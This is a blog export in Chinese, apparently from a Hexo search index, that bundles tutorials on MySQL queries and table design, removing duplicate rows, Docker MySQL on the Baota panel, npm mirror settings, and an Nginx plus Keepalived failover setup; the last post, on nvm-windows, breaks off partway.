的数据，发现在客户端成功完成了与 Redis 的同步操作 # 相关异常： Canal 异常： dump address /124.222.106.122:3306 has an error, retrying. caused by java.la 解决办法：重启 Mysql，删除 example 下的 dat 后缀文件后重启 canal 其他： ​ 是否开放端口 11111 ​ mysql 是否连接成功，查看 logs/example/example.log ​ 服务端与客户端是否连接成功，查看当前项目日志即可 # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2021/04/02/%E3%80%90MySQL%E3%80%91%E3%80%90Redis%E3%80%91Redis%E4%B8%8EMysql%20Master%E4%B8%8ESlave%E5%90%8C%E6%AD%A5%EF%BC%9Acanal%E6%95%99%E5%AD%A6/"},{"title":"mysql查询技巧","text":"# mysql 查询当天、昨天、本周、上周、本月、上月、今年、去年数据 # mysql 查询今天、昨天、7 天、近 30 天、本月、上一月 数据 今天 select * from 表名 where to_days (时间字段名) = to_days (now ()); 昨天 SELECT * FROM 表名 WHERE TO_DAYS (NOW () ) - TO_DAYS ( 时间字段名) = 1 近 7 天 SELECT * FROM 表名 where DATE_SUB (CURDATE (), INTERVAL 7 DAY) &lt;= date (时间字段名) 查询当前这周的数据 SELECT name,submittime FROM enterprise WHERE YEARWEEK (date_format (submittime,’% Y-% m-% d’)) = YEARWEEK (now ()); 查询上周的数据 SELECT name,submittime FROM enterprise WHERE YEARWEEK (date_format (submittime,’% Y-% m-% d’)) = YEARWEEK (now ())-1; 近 30 天 SELECT * FROM 表名 where DATE_SUB (CURDATE (), INTERVAL 30 DAY) &lt;= date (时间字段名) 本月 SELECT * FROM 表名 WHERE DATE_FORMAT ( 时间字段名，‘% Y% m’ ) = DATE_FORMAT ( CURDATE ( ) , ‘% Y% m’ ) 上一月 SELECT * FROM 表名 WHERE PERIOD_DIFF (date_format ( now () , ‘% Y% m’ ) , date_format ( 时间字段名，‘% Y% m’ ) ) =1 查询距离当前现在 6 个月的数据 select name,submittime from enterprise where submittime between date_sub (now (),interval 6 month) and now (); #查询本季度数据 select * from ht_invoice_information where QUARTER(create_date)=QUARTER(now()); 查询上季度数据 select * from ht_invoice_information where QUARTER(create_date)=QUARTER(DATE_SUB(now(),interval 1 QUARTER)); 查询本年数据 select * from ht_invoice_information where YEAR(create_date)=YEAR(NOW()); 查询上年数据 select * from ht_invoice_information where year(create_date)=year(date_sub(now(),interval 1 year)); # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2021/06/08/%E3%80%90MySQL%E3%80%91Mysql%E6%9F%A5%E8%AF%A2%E6%8A%80%E5%B7%A7/"},{"title":"宝塔部署Docker—Mysql镜像","text":"转自 https://blog.csdn.net/u011630259/article/details/124497343 # 宝塔部署 Docker—Mysql 镜像 如何在面板上使用 Docker 项目管理器快速创建多个版本的 MySQL？手把手的教你如何创建多个版本的 MySQL 服务 环境介绍： 宿主机：CentOS7.9 配置：2 核 4G（测试机器，生产环境建议配置高点） 面板版本：7.9.26（测试版） Docker 项目管理器：3.9 Docker 版本：Docker version 20.10.14, build a224086 测试 MySQL 版本： MySQL5.7.37 MySQL8.0.28 1、获取 MySQL 版本 默认情况下，直接输入 mysql 名，会拉取 mysql:latest 镜像，就是最新版本的镜像，指定版本后拉取的是指定版本的 MySQL 镜像，如 mysql:5.7.37 2、创建容器： 指定容器中数据库的密码： MYSQL_ROOT_PASSWORD=dapaotest1 3、容器创建成功后，进入终端命令行查看数据库 4、创建数据库表 123456789101112查看数据库的命令show databases;创建数据库的命令create database dapaodocker;创建用户的命令create user 'dapaodocker'@'%' identified by 'dapao666!';授权grant all on dapaodocker.* to dapaodocker@'%';查看用户权限select host,user from user;测试数据库是否可以连接 # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2022/05/11/%E3%80%90MySQL%E3%80%91%E5%AE%9D%E5%A1%94%E9%83%A8%E7%BD%B2Docker%E2%80%94Mysql%E9%95%9C%E5%83%8F/"},{"title":"【MySql】21个MySQL表设计的经验准则","text":"# 【MySql】21 个 MySQL 表设计的经验准则 1.命名规范 数据库表名、字段名、索引名等都需要命名规范，可读性高(一般要求用英文)，让别人一看命名，就知道这个字段表示什么意思。 比如一个表的账号字段，反例如下： acc_no,1_acc_no,zhanghao 正例： account_no,account_number 表名、字段名必须使用小写字母或者数字，禁止使用数字开头，禁止使用拼音，并且一般不使用英文缩写。 主键索引名为pk_字段名；唯一索引名为uk_字段名；普通索引名则为idx_字段名。 2.选择合适的字段类型 设计表时，我们需要选择合适的字段类型，比如： 尽可能选择存储空间小的字段类型，就好像数字类型的，从tinyint、smallint、int、bigint从左往右开始选择 小数类型如金额，则选择 decimal，禁止使用 float 和 double。 如果存储的字符串长度几乎相等，使用 char 定长字符串类型。 varchar是可变长字符串，不预先分配存储空间，长度不要超过5000。 如果存储的值太大，建议字段类型修改为text，同时抽出单独一张表，用主键与之对应。 同一表中，所有varchar字段的长度加起来，不能大于65535. 如果有这样的需求，请使用TEXT/LONGTEXT 类型。 3. 主键设计要合理 主键设计的话，最好不要与业务逻辑有所关联。有些业务上的字段，比如身份证，虽然是唯一的，一些开发者喜欢用它来做主键，但是不是很建议哈。主键最好是毫无意义的一串独立不重复的数字，比如UUID，又或者Auto_increment自增的主键，或者是雪花算法生成的主键等等; 4. 选择合适的字段长度 先问大家一个问题，大家知道数据库字段长度表示字符长度还是字节长度嘛？ 其实在mysql中，varchar和char类型表示字符长度，而其他类型表示的长度都表示字节长度。比如char(10)表示字符长度是10，而bigint（4）表示显示长度是4个字节，但是因为bigint实际长度是8个字节，所以bigint（4）的实际长度就是8个字节。 我们在设计表的时候，需要充分考虑一个字段的长度，比如一个用户名字段（它的长度5~20个字符），你觉得应该设置多长呢？可以考虑设置为 username varchar（32）。字段长度一般设置为2的幂哈（也就是2的n次方）。’; 5，优先考虑逻辑删除，而不是物理删除 什么是物理删除？什么是逻辑删除？ 物理删除：把数据从硬盘中删除，可释放存储空间 逻辑删除：给数据添加一个字段，比如is_deleted，以标记该数据已经逻辑删除。 物理删除就是执行delete语句，如删除account_no =‘666’的账户信息SQL如下： delete from account_info_tab whereaccount_no ='666'; 逻辑删除呢，就是这样： update account_info_tab set is_deleted = 1 where account_no ='666'; 为什么推荐用逻辑删除，不推荐物理删除呢？ 为什么不推荐使用物理删除，因为恢复数据很困难 物理删除会使自增主键不再连续 核心业务表 的数据不建议做物理删除，只适合做状态变更。 6. 每个表都需要添加这几个通用字段如主键、create_time、modifed_time等 表必备一般来说，或具备这几个字段： id：主键，一个表必须得有主键，必须 create_time：创建时间，必须 modifed_time/update_time: 修改时间，必须，更新记录时，需要更新它 version : 数据记录的版本号，用于乐观锁，非必须 remark ：数据记录备注，非必须 modified_by :修改人，非必须 creator ：创建人，非必须 7. 一张表的字段不宜过多 我们建表的时候，要牢记，一张表的字段不宜过多哈，一般尽量不要超过20个字段哈。笔者记得上个公司，有伙伴设计开户表，加了五十多个字段。。。 如果一张表的字段过多，表中保存的数据可能就会很大，查询效率就会很低。因此，一张表不要设计太多字段哈，如果业务需求，实在需要很多字段，可以把一张大的表，拆成多张小的表，它们的主键相同即可。 当表的字段数非常多时，可以将表分成两张表，一张作为条件查询表，一张作为详细内容表 (主要是为了性能考虑)。 8. 尽可能使用not null定义字段 如果没有特殊的理由， 一般都建议将字段定义为 NOT NULL 。 为什么呢？ 首先， NOT NULL 可以防止出现空指针问题。 其次，NULL值存储也需要额外的空间的，它也会导致比较运算更为复杂，使优化器难以优化SQL。 NULL值有可能会导致索引失效 如果将字段默认设置成一个空字符串或常量值并没有什么不同，且都不会影响到应用逻辑， 那就可以将这个字段设置为NOT NULL。 9. 设计表时，评估哪些字段需要加索引 首先，评估你的表数据量。如果你的表数据量只有一百几十行，就没有必要加索引。否则设计表的时候，如果有查询条件的字段，一般就需要建立索引。但是索引也不能滥用： 索引也不要建得太多，一般单表索引个数不要超过5个。因为创建过多的索引，会降低写得速度。 区分度不高的字段，不能加索引，如性别等 索引创建完后，还是要注意避免索引失效的情况，如使用mysql的内置函数，会导致索引失效的 索引过多的话，可以通过联合索引的话方式来优化。然后的话，索引还有一些规则，如覆盖索引，最左匹配原则等等。。 假设你新建一张用户表，如下： CREATE TABLE user_info_tab ( `id` int(11) NOT NULL AUTO_INCREMENT, `user_id` int(11) NOT NULL, `age` int(11) DEFAULT NULL, `name` varchar(255) NOT NULL, `create_time` datetime NOT NULL, `modifed_time` datetime NOT NULL, PRIMARY KEY (`id`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8; 对于这张表，很可能会有根据user_id或者name查询用户信息，并且，user_id是唯一的。因此，你是可以给user_id加上唯一索引，name加上普通索引。 CREATE TABLE user_info_tab ( `id` int(11) NOT NULL AUTO_INCREMENT, `user_id` int(11) NOT NULL, `age` int(11) DEFAULT NULL, `name` varchar(255) NOT NULL, `create_time` datetime NOT NULL, `modifed_time` datetime NOT NULL, PRIMARY KEY (`id`), KEY `idx_name` (`name`) USING BTREE, UNIQUE KEY un_user_id (user_id) ) ENGINE=InnoDB DEFAULT CHARSET=utf8; 10. 不需要严格遵守 3NF，通过业务字段冗余来减少表关联 什么是数据库三范式（3NF），大家是否还有印象吗？ 第一范式：对属性的原子性，要求属性具有原子性，不可再分解； 第二范式：对记录的唯一性，要求记录有唯一标识，即实体的唯一性，即不存在部分依赖； 第三方式：对字段的冗余性，要求任何字段不能由其他字段派生出来，它要求字段没有冗余，即不存在传递依赖； 我们设计表及其字段之间的关系, 应尽量满足第三范式。但是有时候，可以适当冗余，来提高效率。比如以下这张表 商品名称 商品型号 单价 数量 总金额 手机 华为 8000 5 40000 以上这张存放商品信息的基本表。总金额这个字段的存在，表明该表的设计不满足第三范式，因为总金额可以由单价*数量得到，说明总金额是冗余字段。但是，增加总金额这个冗余字段，可以提高查询统计的速度，这就是以空间换时间的作法。 当然，这只是个小例子哈，大家开发设计的时候，要结合具体业务分析哈。 11. 避免使用MySQL保留字 如果库名、表名、字段名等属性含有保留字时，SQL语句必须用反引号来引用属性名称，这将使得SQL语句书写、SHELL脚本中变量的转义等变得非常复杂。 因此，我们一般避免使用MySQL保留字，如select、interval、desc等等 12. 不搞外键关联，一般都在代码维护 什么是外键呢？ 外键，也叫FOREIGN KEY，它是用于将两个表连接在一起的键。FOREIGN KEY是一个表中的一个字段（或字段集合），它引用另一个表中的PRIMARY KEY。它是用来保证数据的一致性和完整性的。 阿里的Java规范也有这么一条： 【强制】不得使用外键与级联，一切外键概念必须在应用层解决。 我们为什么不推荐使用外键呢？ 使用外键存在性能问题、并发死锁问题、使用起来不方便等等。每次做DELETE或者UPDATE都必须考虑外键约束，会导致开发的时候很难受,测试数据造数据也不方便。 还有一个场景不能使用外键，就是分库分表。 13. 一般都选择INNODB存储引擎 建表是需要选择存储引擎的，我们一般都选择INNODB存储引擎，除非读写比率小于1%, 才考虑使用MyISAM 。 有些小伙伴可能会有疑惑，不是还有MEMORY等其他存储引擎吗？什么时候使用它呢？其实其他存储引擎一般除了都建议在DBA的指导下使用。 我们来复习一下这MySQL这三种存储引擎的对比区别吧： 特性 INNODB MyISAM MEMORY 事务安全 支持 无 无 存储限制 64TB 有 有 空间使用 高 低 低 内存使用 高 低 高 插入数据速度 低 高 高 是否支持外键 支持 无 无 14. 选择合适统一的字符集。 数据库库、表、开发程序等都需要统一字符集，通常中英文环境用utf8。 MySQL支持的字符集有utf8、utf8mb4、GBK、latin1等。 utf8：支持中英文混合场景，国际通过，3个字节长度 utf8mb4: &nbsp; 完全兼容utf8，4个字节长度，一般存储emoji表情需要用到它。 GBK ：支持中文，但是不支持国际通用字符集，2个字节长度 latin1：MySQL默认字符集，1个字节长度 15. 如果你的数据库字段是枚举类型的，需要在comment注释清楚 如果你设计的数据库字段是枚举类型的话，就需要在comment后面注释清楚每个枚举的意思，以便于维护 正例如下： `session_status` varchar(2) COLLATE utf8_bin NOT NULL COMMENT 'session授权态 00：在线-授权态有效 01：下线-授权态失效 02：下线-主动退出 03：下线-在别处被登录' 反例： `session_status` varchar(2) COLLATE utf8_bin NOT NULL COMMENT 'session授权态' 并且，如果你的枚举类型在未来的版本有增加修改的话，也需要同时维护到comment后面。 16.时间的类型选择 我们设计表的时候，一般都需要加通用时间的字段，如create_time、modified_time等等。那对于时间的类型，我们该如何选择呢？ 对于MySQL来说，主要有date、datetime、time、timestamp 和 year。 date ：表示的日期值, 格式yyyy-mm-dd,范围1000-01-01 到 9999-12-31，3字节 time ：表示的时间值，格式 hh:mm:ss，范围-838:59:59 到 838:59:59，3字节 datetime：表示的日期时间值，格式yyyy-mm-dd hh:mm:ss，范围1000-01-01 00:00:00到9999-12-31 23:59:59```,8字节，跟时区无关 timestamp：表示的时间戳值，格式为yyyymmddhhmmss，范围1970-01-01 00:00:01到2038-01-19 03:14:07，4字节，跟时区有关 year：年份值，格式为yyyy。范围1901到2155，1字节 推荐优先使用datetime类型来保存日期和时间，因为存储范围更大，且跟时区无关。 17. 不建议使用Stored procedure (包括存储过程，触发器) 。 什么是存储过程 已预编译为一个可执行过程的一个或多个SQL语句。 什么是触发器 触发器，指一段代码，当触发某个事件时，自动执行这些代码。使用场景： 可以通过数据库中的相关表实现级联更改。 实时监控某张表中的某个字段的更改而需要做出相应的处理。 例如可以生成某些业务的编号。 注意不要滥用，否则会造成数据库及应用程序的维护困难。 对于MYSQL来说，存储过程、触发器等还不是很成熟， 并没有完善的出错记录处理，不建议使用。 18. 1:N 关系的设计 日常开发中，1对多的关系应该是非常常见的。比如一个班级有多个学生，一个部门有多个员工等等。这种的建表原则就是：在从表（N的这一方）创建一个字段，以字段作为外键指向主表（1的这一方）的主键。示意图如下: 学生表是多（N）的一方，会有个字段class_id保存班级表的主键。当然，一班不加外键约束哈，只是单纯保存这个关系而已。 有时候两张表存在N:N关系时，我们应该消除这种关系。通过增加第三张表，把N:N修改为两个 1:N。比如图书和读者，是一个典型的多对多的关系。一本书可以被多个读者借，一个读者又可以借多本书。我们就可以设计一个借书表，包含图书表的主键，以及读者的主键，以及借还标记等字段。 19. 大字段 设计表的时候，我们尤其需要关注一些大字段，即占用较多存储空间的字段。比如用来记录用户评论的字段，又或者记录博客内容的字段，又或者保存合同数据的字段。如果直接把表字段设计成text类型的话，就会浪费存储空间，查询效率也不好。 在MySQl中，这种方式保存的设计方案，其实是不太合理的。这种非常大的数据，可以保存到mongodb中，然后，在业务表保存对应mongodb的id即可。 这种设计思想类似于，我们表字段保存图片时，为什么不是保存图片内容，而是直接保存图片url即可。 20. 考虑是否需要分库分表 什么是分库分表呢？ 分库：就是一个数据库分成多个数据库，部署到不同机器。 分表：就是一个数据库表分成多个表。 我们在设计表的时候，其实可以提前估算一下，是否需要做分库分表。比如一些用户信息，未来可能数据量到达百万设置千万的话，就可以提前考虑分库分表。 为什么需要分库分表: 数据量太大的话，SQL的查询就会变慢。如果一个查询SQL没命中索引，千百万数据量级别的表可能会拖垮整个数据库。即使SQL命中了索引，如果表的数据量超过一千万的话，查询也是会明显变慢的。这是因为索引一般是B+树结构，数据千万级别的话，B+树的高度会增高，查询就变慢啦。 分库分表主要有水平拆分、垂直拆分的说法，拆分策略有range范围、hash取模。而分库分表主要有这些问题： 事务问题 跨库关联 排序问题 分页问题 分布式ID 21. sqL 编写的一些优化经验 最后的话，跟大家聊来一些写SQL的经验吧： 查询SQL尽量不要使用select *，而是select具体字段 如果知道查询结果只有一条或者只要最大/最小一条记录，建议用limit 1 应尽量避免在where子句中使用or来连接条件 注意优化limit深分页问题 使用where条件限定要查询的数据，避免返回多余的行 尽量避免在索引列上使用mysql的内置函数 应尽量避免在 where子句中对字段进行表达式操作 应尽量避免在where 子句中使用!=或&lt;&gt;操作符 使用联合索引时，注意索引列的顺序，一般遵循最左匹配原则。 对查询进行优化，应考虑在where 及 order by涉及的列上建立索引 如果插入数据过多，考虑批量插入 在适当的时候，使用覆盖索引 使用explain 分析你SQL的计划 # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2023/04/27/%E3%80%90MySql%E3%80%9121%E4%B8%AAMySQL%E8%A1%A8%E8%AE%BE%E8%AE%A1%E7%9A%84%E7%BB%8F%E9%AA%8C%E5%87%86%E5%88%99/"},{"title":"【Mysql】Mysql删除重复数据只保留一条","text":"# 【Mysql】Mysql 删除重复数据只保留一条 （1）以这张表为例： 1234567CREATE TABLE `test` ( `id` varchar(32) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '注解id', `name` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '名字', PRIMARY KEY (`id`) USING BTREE) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Compact;INSERT INTO test (id,`name`) VALUES (replace(uuid(),'-',''),'张三'),(replace(uuid(),'-',''),'张三'); 表里有两条数据，然后名字是相同的，但是 id 是不同的，现在要求是只留一条数据： （2）查询 name 值重复的数据： 现实开发当中可能一个字段无法锁定重复值，可以采取 group by 多个值！利用多个值来锁定重复的行数据！ 1SELECT name FROM test GROUP BY `name` HAVING count( name ) &gt; 1 （3）查询重复数据里面每个最小的 id： 1SELECT min(id) as id FROM test GROUP BY `name` HAVING count( name ) &gt; 1 （4）查询去掉重复数据最小 id 的其他数据：也就是要删除的数据！ 1234SELECT * FROM test WHERE name IN ( SELECT name FROM test GROUP BY `name` HAVING count( name ) &gt; 1 ) AND id NOT IN (SELECT min( id ) FROM test GROUP BY `name` HAVING count( NAME ) &gt; 1) （5）删除去掉重复数据最小 id 的其他数据： 可能这时候有人该说了，有了查询，直接改成 delete 不就可以了，真的是这样吗？其实不是的，如下运行报错： 首先明确一点这个错误只会发生在 delete 语句或者 update 语句，拿 update 来举例 : update A表 set A列 = (select B列 from A表)； 这种写法就会报这个错误，原因：你又要修改 A 表，然后又要从 A 表查数据，而且还是同层级。Mysql 就会认为是语法错误！ 嵌套一层就可以解决， update A表 set A列 = (select a.B列 from (select * from A表) a); 当然这个只是个示例，这个示例也存在一定的问题，比如 (select a.B列 from (select * from A表) a) 他会查出来多条，然后赋值的时候会报 1242 - Subquery returns more than 1 row 。 嵌套一层他就可以和 update 撇清关系，会优先查括号里面的内容，查询结果出来过后会给存起来，类似临时表，可能有的人该好奇了， update A表 set A列 = (select B列 from A表)； 我明明加括号了呀，难道不算嵌套吗，当然不算，那个括号根本没有解决他们之间的层次关系！ 详解看这篇文章：https://blog.csdn.net/weixin_43888891/article/details/127000534 （6）正确的写法： 方式一： 1234DELETE FROM test WHERE name IN ( select a.name from (SELECT name FROM test GROUP BY `name` HAVING count( name ) &gt; 1) a) AND id NOT IN (select a.id from (SELECT min(id) as id FROM test GROUP BY `name` HAVING count( name ) &gt; 1) a) 注意：删除之前一定要先查询，然后再删除，否则一旦语法有问题导致删了不想删除的数据，想要恢复很麻烦！或者删除前备份好数据，不要嫌麻烦，一旦出问题，才是真正的大麻烦！ 方式二： 12345678DELETE FROM test WHERE id NOT IN ( SELECT t.id FROM ( SELECT MIN(id) as id FROM test GROUP BY NAME ) t) （7）错误的写法： 这块我吃过一次亏，所以专门写出来，避免踩坑！ 千万千万不能这么搞，下面这个语法相当于是先按 name 分组，然后查出来大于 1 的，这时候假如大于 1 的有很多，然后外面嵌套的那一层，只取了最小的一条数据，然后再加上使用的是 NOT IN ，最终会导致数据全部被删除！！！ 执行前有四条数据，实际上我们要的是张三留下来一条，然后李四留下来一条 执行结果：只留下了一条！ # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2021/08/15/%E3%80%90Mysql%E3%80%91Mysql%E5%88%A0%E9%99%A4%E9%87%8D%E5%A4%8D%E6%95%B0%E6%8D%AE%E5%8F%AA%E4%BF%9D%E7%95%99%E4%B8%80%E6%9D%A1/"},{"title":"【Npm】npm install时卡住怎么办？","text":"# 【Npm】npm install 时卡住怎么办？ # 方法一：安装 cnpm 镜像 这个是比较常用的方法，我首先也是使用了这个方法。 cnpm 的安装方法，参考 http://npm.taobao.org/ 1npm install -g cnpm --registry=https:``//registry.npm.taobao.org 在 cmd 中输入以上命令就可以了，然后再使用 cnpm 安装 1cnpm install -g nodemon 后面的操作跟不使用镜像的操作是差不多的。 # 方法二：使用代理 registry 在网上查阅了一些资料后，决定使用代理的方式，方法也很简单，就是 1npm config set registry https://registry.npm.taobao.org 然后后续的 install 等命令还是通过 npm 运作，而不是 cnpm。 # 后记补充： npm install 有 bug, 大家可以安装 yarn 替代。 步骤： Yarn、React Native 的命令行工具（react-native-cli） Yarn 是 Facebook 提供的替代 npm 的工具，可以加速 node 模块的下载。React Native 的命令行工具用于执行创建、初始化、更新项目、运行打包服务（packager）等任务。 1npm install -g yarn react-native-cli 安装完 yarn 后同理也要设置镜像源： 1yarn config set registry https:``//registry.npm.taobao.org --global``yarn config set disturl https:``//npm.taobao.org/dist --global 如果你遇到 EACCES: permission denied 权限错误，可以尝试运行下面的命令（限 linux 系统）： sudo npm install -g yarn react-native-cli. 安装完 yarn 之后就可以用 yarn 代替 npm 了，例如用 yarn 代替 npm install 命令，用 yarn add 某第三方库名代替 npm install --save 某第三方库名。 ** 注意：** 目前 npm5（发文时最新版本为 5.0.4）存在安装新库时会删除其他库的问题，导致项目无法正常运行。请尽量使用 yarn 代替 npm 操作。 # 转载与参考 https://blog.csdn.net/WXF_Sir/article/details/112944559 解决 npm install 总是卡住不动的问题 https://www.cnblogs.com/pijunqi/p/14362901.html 解决 npm install 卡住不动的小尴尬 https://www.cnblogs.com/wenbinjiang/p/11062959.html # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2021/09/16/%E3%80%90Npm%E3%80%91npm%20install%E6%97%B6%E5%8D%A1%E4%BD%8F%E6%80%8E%E4%B9%88%E5%8A%9E%EF%BC%9F/"},{"title":"Nginx以及Keepalived安装以及部署","text":"​ 反向代理：指的是用户要访问 youtube, 但是 youtube 悄悄地把这个请求交给后台 N 台服务器中的其中一台来做，这种方式就是反向代理了。 ​ 负载均衡： 1) 使用硬件负载均衡策略，如使用 F5,Array 等负载均衡器. 2) 使用软件进行负载均衡 3) 如使用阿里云服务器均衡 SLB 4) 使用我们今天所学习的 Nginx+Keepalived 5) 其他软件负载均衡如 LVS (Linux Virtual Server),haproxy 等技术 # 环境搭建： 1234567891011121314151617181920步骤:1.进行安装:tar -zxvf /root/software/nginx-1.6.2.tar.gz -C /usr/local/2.下载所需要的依赖库文件: yum install pcre -y yum install pcre-devel -y yum install zlib -y yum install zlib-devel -y3.进行configure配置,查看是否报错 cd nginx-1.6.2 ./configure --prefix=/usr/local/nginx4.编译安装:make &amp;&amp; make install5.在 /usr/local/nginx目录下,可以看到如下4个目录 conf配置文件,html网页文件,logs日志文件,sbin主要二进制程序6.启动命令:/usr/local/nginx/sbin/nginx 关闭命令:/usr/local/nginx/sbin/nginx -s stop 重启命令:/usr/local/nginx/sbin/nginx -s reload7.访问浏览器:http://192.168.122.133(看到欢迎页面说明没问题)注意:如果出现这个错误:./configure: error: C compiler cc is not found执行这个命令:yum -y install gcc gcc-c++ autoconf automake make Keepalived： 首先介绍一下 Keepalived, 它是一个高性能的服务器高可用或热备解决方案，Keepalived 主要防止服务器单点故障的问题，可以通过其与 Nginx 的配合实现 web 服务器端的高可用. Keepalived 以 VRRP 协议为实现基础，使用 VRRP 协议来实现高可用性 (HA).VRRP (Virtual Router Redundacy Protocol) 协议用于实现路由器冗余的协议，VRRP 协议将两台或多台路由器设备虚拟成一个设备，向外提供虚拟路由 IP (一个或多个)。 安装以及部署： 123456789101112131415161718192021222324252627282930313233343536373839404142第一步：安装keepalived依赖的包 yum install -y gcc yum install -y openssl-devel yum install -y libnl3-devel yum install -y popt-devel yum install -y iptables-devel yum install -y libnfnetlink-devel yum install -y psmisc第二步：编译安装keepalived 将keepalived的安装包 上传到/usr/local/software 目录下 cd /usr/local/software tar -zxvf keepalived-1.2.19.tar.gz -C /usr/local cd /usr/local/keepalived-1.2.19 ./configure --prefix=/usr/local/keepalived make &amp;&amp; make install 第三步：将 keepalived 安装成 Linux 系统服务 安装完成之后， 需要做一些工作复制默认配置文件到 默认路径 mkdir /etc/keepalived cp /usr/local/keepalived/etc/keepalived/keepalived.conf /etc/keepalived/ cp /usr/local/keepalived/sbin/keepalived /usr/sbin/ cp /usr/local/keepalived/etc/sysconfig/keepalived /etc/sysconfig/ cd /usr/local/keepalived-1.2.19 cp ./keepalived/etc/init.d/keepalived.init /etc/init.d/ chmod 755 /etc/init.d/keepalived.init 第四步：编写nginx检测脚本:vi /etc/keepalived/nginx_check.sh内容如下： #!/bin/bash A=`ps -C nginx –no-header |wc -l` if [ $A -eq 0 ];then /usr/local/nginx/sbin/nginx sleep 2 if [ `ps -C nginx --no-header |wc -l` -eq 0 ];then killall keepalived fi fi 赋予执行权限 chmod +x /etc/keepalived/nginx_check.sh 启动命令: keepalived 修改 Master 配置 123456789101112131415161718192021222324252627282930313233343536373839404142修改keepalived的Master配置文件:vi /etc/keepalived/keepalived.conf ! Configuration File for keepalived global_defs { router_id wolfcode ##路由器标志 } # 集群资源监控，组合track_script进行 vrrp_script check_haproxy { script &quot;/etc/keepalived/nginx_check.sh&quot; #检测 nginx 状态的脚本路径 interval 2 #检测时间间隔 weight -20 #条件成立 权重减20 } vrrp_instance PROXY { # 设置当前主机为主节点，如果是备用节点，则设置为BACKUP state MASTER # 指定HA监测网络接口，可以用ifconfig查看来决定设置哪一个 interface ens32 # 虚拟路由标识，同一个VRRP实例要使用同一个标识，主备机 virtual_router_id 80 # 因为当前环境中VRRP组播有问题，改为使用单播发送VRRP报文 如果VRRP组播没问题，以下这块的内容可以注释掉。 # 这个地方需要关注，之前未做此设置，结果主备节点互相不能发现，因此主备节点都升级成了MASTER，并且绑定了VIP # 主节点时，内容为： unicast_src_ip 192.168.122.133 # 设置优先级，确保主节点的优先级高过备用节点 priority 100 # 用于设定主备节点间同步检查时间间隔 advert_int 2 # 设置主备节点间的通信验证类型及密码，同一个VRRP实例中需一致 authentication { auth_type PASS auth_pass wolfcode } # 集群资源监控，组合vrrp_script进行 track_script { check_haproxy } # 设置虚拟IP地址，当keepalived状态切换为MASTER时，此IP会自动添加到系统中 # 当状态切换到BACKUP时，此IP会自动从系统中删除 # 可以通过命令ip add查看切换后的状态 virtual_ipaddress { 192.168.122.110 #虚拟ip配置完之后就用它访问 } } 修改 Slave 配置： 123456789101112131415161718192021222324252627282930313233343536373839404142修改keepalived的Slave配置文件:vi /etc/keepalived/keepalived.conf ! Configuration File for keepalived global_defs { router_id wolfcode ##路由器标志 } # 集群资源监控，组合track_script进行 vrrp_script check_haproxy { script &quot;/etc/keepalived/nginx_check.sh&quot; #检测 nginx 状态的脚本路径 interval 2 #检测时间间隔 weight -20 #条件成立 权重减20 } vrrp_instance PROXY { # 设置当前主机为主节点，如果是备用节点，则设置为BACKUP state BACKUP # 指定HA监测网络接口，可以用ifconfig查看来决定设置哪一个 interface ens32 # 虚拟路由标识，同一个VRRP实例要使用同一个标识，主备机 virtual_router_id 80 # 因为当前环境中VRRP组播有问题，改为使用单播发送VRRP报文 如果VRRP组播没问题，以下这块的内容可以注释掉。 # 这个地方需要关注，之前未做此设置，结果主备节点互相不能发现，因此主备节点都升级成了MASTER，并且绑定了VIP # 主节点时，内容为： unicast_src_ip 192.168.122.134 # 设置优先级，确保主节点的优先级高过备用节点 priority 90 # 用于设定主备节点间同步检查时间间隔 advert_int 2 # 设置主备节点间的通信验证类型及密码，同一个VRRP实例中需一致 authentication { auth_type PASS auth_pass wolfcode } # 集群资源监控，组合vrrp_script进行 track_script { check_haproxy } # 设置虚拟IP地址，当keepalived状态切换为MASTER时，此IP会自动添加到系统中 # 当状态切换到BACKUP时，此IP会自动从系统中删除 # 可以通过命令ip add查看切换后的状态 virtual_ipaddress { 192.168.122.110 #虚拟ip配置完之后就用它访问 } } # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2020/12/19/%E3%80%90Nginx%E3%80%91Nginx%E4%BB%A5%E5%8F%8Akeepalived%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E9%83%A8%E7%BD%B2/"},{"title":"【NodeJS】Windows环境下如何做Node多版本管理？","text":"# 【NodeJS】Windows 环境下如何做 Node 多版本管理？ # 前言 ​ 在多个不同的前端项目中，总会遇到 nodeJs 需求版本不一致的情况，例如，项目 A 需要 node12 版本，项目 B 要求不能小于 node16 版本，此时就产生了冲突，因此我们需要使用一个 Node 版本控制来解决这一系列的问题。 # nvm-windows ​ 在 Windows 环境下，可以使用 nvm-windows 工具来管理多个 Node.js 版本。与 nvm 相似， nvm-windows 也是一个 Node.js 